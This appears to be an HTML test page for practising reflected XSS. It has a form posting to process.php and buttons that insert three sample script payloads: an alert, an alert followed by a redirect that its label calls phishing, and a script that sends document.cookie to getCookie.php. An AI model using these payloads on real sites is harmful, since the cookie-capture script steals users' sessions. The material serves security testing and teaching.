<!DOCTYPE html>
<html lang="zh-TW">

<head>
    <meta charset="UTF-8">
    <title>XSS 測試網站</title>
</head>

<body>
    <h1>反射型 XSS 測試</h1>
    <form action="process.php" method="get">
        <label for="userInput">輸入一些腳本內容：</label>
        <textarea id="userInput" name="userInput" style="width: 300px; height: 50px;" placeholder=""></textarea>
        <button type="submit">提交</button>
    </form>
    <hr>
    <button onclick="insertText('script_one')">插入測試腳本 => 跳alert</button>
    <div id="script_one" class="text-container">
        &lt;script&gt;
        alert('XSS');
        &lt;/script&gt;
    </div>
    <hr>
    <button onclick="insertText('script_two')">插入測試腳本2 => 跳alert，並使用戶頁面轉向釣魚</button>
    <div id="script_two" class="text-container">
        &lt;script&gt;
        alert("歡迎！您將被重定向到 Google。");
        window.location.href = "https://www.google.com";
        &lt;/script&gt;
    </div>
    <hr>
    <button onclick="insertText('script_three')">插入測試腳本3 => 截獲用戶cookie到我的api做處理</button>
    <div id="script_three" class="text-container">
        <pre>
&lt;script&gt;
    function showAlertAndRedirect() {
        if (confirm('點擊確認後將發送 Cookies 並跳轉到 getCookie.php')) {
            const cookies = document.cookie;
            const formData = new FormData();
            formData.append('cookies', cookies);
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'getCookie.php';
            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = 'cookies';
            input.value = cookies;
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }
    }
    showAlertAndRedirect();
&lt;/script&gt;
</pre>
    </div>

    <script>
    function insertText(divId) {
        var textarea = document.getElementById('userInput');
        var text = document.getElementById(divId).innerText;
        textarea.value += text;
    }
    </script>
</body>

</html>